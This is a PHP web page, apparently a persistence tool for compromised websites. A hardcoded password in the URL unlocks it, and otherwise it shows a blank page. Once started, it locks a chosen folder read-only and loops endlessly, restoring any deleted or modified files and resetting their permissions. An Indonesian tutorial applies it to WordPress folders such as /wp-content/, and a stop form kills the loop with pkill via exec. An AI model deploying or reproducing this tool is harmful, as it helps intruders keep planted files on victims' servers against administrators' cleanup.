<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@Bukan_Seo</title>
    <link href="https://fonts.googleapis.com/css2?family=Jolly+Lodger&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 20px;
            background-color: black;
            color: white;
        }
        h1 {
            font-family: 'Jolly Lodger', cursive;
            text-align: center;
            color: white;
            text-shadow: 2px 2px 0 red;
        }
        input[type="text"], input[type="submit"] {
            display: block;
            margin: 10px auto;
            padding: 10px;
            width: 300px;
        }
        input[type="submit"] {
            cursor: pointer;
        }
        label {
            color: white;
        }
        .image-container {
            margin-top: 20px;
            border: 2px solid red;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.1);
        }
        .image-container img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>

<?php
if (isset($_GET['pass']) && $_GET['pass'] === 'RtX5080uZu') {
    ?>

    <center><h1>Tools Hold Folder</h1></center>
    <form method="post">
        <label for="folderPath">Masukkan Path Folder:</label>
        <input type="text" id="folderPath" name="folderPath" required>
        
        <input type="submit" name="startMonitor" value="Gasskannnn">
    </form>

    <form method="post">
        <label for="stopCommand">Stop Hold Folder? (masukkan nama file):</label>
        <input type="text" id="stopCommand" name="stopCommand" placeholder="namafilehold.php" required>
        
        <input type="submit" name="stopMonitor" value="Gasskannnn">
    </form>
    <br><br><br>
    </center>

    <script>
        document.querySelector('form').onsubmit = function() {
            setTimeout(function() {
                window.location.reload();
                alert("Hold Berhasil !!!!! Abangkuuuu");
            }, 3000);
        };
    </script>

    <?php
    // PHP logic untuk memproses form
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['startMonitor'])) {
            $folderPath = rtrim($_POST['folderPath'], '/');
            $originalPermissionsFolder = 0555;
            $filePermissions = 0444;

            // Fungsi untuk memonitor folder dan subfolder
            function monitorFolder($path, $originalPermissionsFolder, $filePermissions) {
                $originalFilesContent = [];
                $filesInFolder = scandir($path);

                foreach ($filesInFolder as $file) {
                    if ($file !== '.' && $file !== '..') {
                        $filePath = $path . '/' . $file;

                        // Jika ini adalah folder, panggil fungsi rekursif
                        if (is_dir($filePath)) {
                            monitorFolder($filePath, $originalPermissionsFolder, $filePermissions);
                        } else {
                            // Simpan isi dan set permission
                            $originalFilesContent[$file] = file_get_contents($filePath);
                            chmod($filePath, $filePermissions);
                        }
                    }
                }

                // Monitor Folder
                while (true) {
                    clearstatcache();
                    
                    // Cek dan perbaiki permissions folder
                    if (fileperms($path) !== $originalPermissionsFolder) {
                        chmod($path, $originalPermissionsFolder);
                    }

                    // Cek isi dan permissions file
                    foreach ($originalFilesContent as $file => $content) {
                        $filePath = $path . '/' . $file;

                        if (!file_exists($filePath)) {
                            // Jika file dihapus, buat file baru dengan isi asli
                            file_put_contents($filePath, $content);
                            chmod($filePath, $filePermissions);
                        } else {
                            // Cek jika ada perubahan isi file
                            $currentContent = file_get_contents($filePath);
                            if ($currentContent !== $content) {
                                file_put_contents($filePath, $content);
                                echo "File '$file' telah diubah. Mengembalikan ke kondisi semula...\n";
                            }

                            // Cek jika permission file berubah
                            $currentPermissions = fileperms($filePath);
                            if ($currentPermissions !== $filePermissions) {
                                chmod($filePath, $filePermissions);
                                echo "Permission file '$file' telah diubah. Mengembalikan ke kondisi semula...\n";
                            }
                        }
                    }

                    // Delay 1 detik
                    sleep(1);
                }
            }

            monitorFolder($folderPath, $originalPermissionsFolder, $filePermissions);
        }

        if (isset($_POST['stopMonitor'])) {
            $stopCommand = 'pkill -9 -f ' . escapeshellarg($_POST['stopCommand']);
            exec($stopCommand);
            echo "Monitor telah dihentikan.";
        }
    }
    ?>

    <div class="image-container">
        <h3>Tutorial Hold Folder :</h3>
        <center>
            <h5>Bagaimana cara memasukan path folder ?<br>tinggal copy bagian /home/user/public_html/namafolderkalian/<br>sebagai contoh nama folder saya /wp-content/<br></h5>
            <a href="https://ibb.co.com/2KG645z"><img src="https://i.ibb.co.com/ZTqJDNQ/IMG-20241227-090443.jpg" alt="IMG-20241227-090443" border="0" alt="Naruto"></a><br><br>
            <h5>jadi tinggal masukan path folder /home/digitali/public_html/wp-content/<br>setelah itu klik tombol "Gasskannnn" otomatis folder /wp-content/ tadi udah gabisa dihapus<br>silakan coba sendiri</h5>
            <a href="https://ibb.co.com/R3F288H"><img src="https://i.ibb.co.com/LxFSKKp/IMG-20241227-092133.jpg" alt="IMG-20241227-092133" border="0" alt="Naruto"></a><br><br>
        </center>
        <h3>Tutorial Stop Hold Folder :</h3>
        <center>
            <h5>Fungsinya jika kalian salah mengunci folder lain<br>lalu tidak dapat menghapusnya<br>sebagai contoh folder /wp-includes/ sudah terkunci<br></h5>
            <a href="https://ibb.co.com/MpWb7wY"><img src="https://i.ibb.co.com/5vtdLpN/IMG-20241227-094043.jpg" alt="IMG-20241227-094043" border="0" alt="Naruto"></a><br><br>
            <h5>Kalian cukup mengetik nama file holdnya<br>sebagai contoh tadi saya tidak sengaja mengunci <br>folder /wp-includes/ dengan nama file hold.php<br>lalu tinggal ketik hold.php klik "Gasskannnn"<br>otomatis folder yang tadi terkunci jadi terbuka</h5>
            <a href="https://ibb.co.com/9ySTZRh"><img src="https://i.ibb.co.com/P10hDBM/IMG-20241227-094604.jpg" alt="IMG-20241227-094604" border="0" alt="Naruto"><a><br><br>
        </div>
    </center>

    <?php
} else {
    // Jika parameter tidak valid, tampilkan halaman kosong
    echo '';
}
?>
</body>
</html>
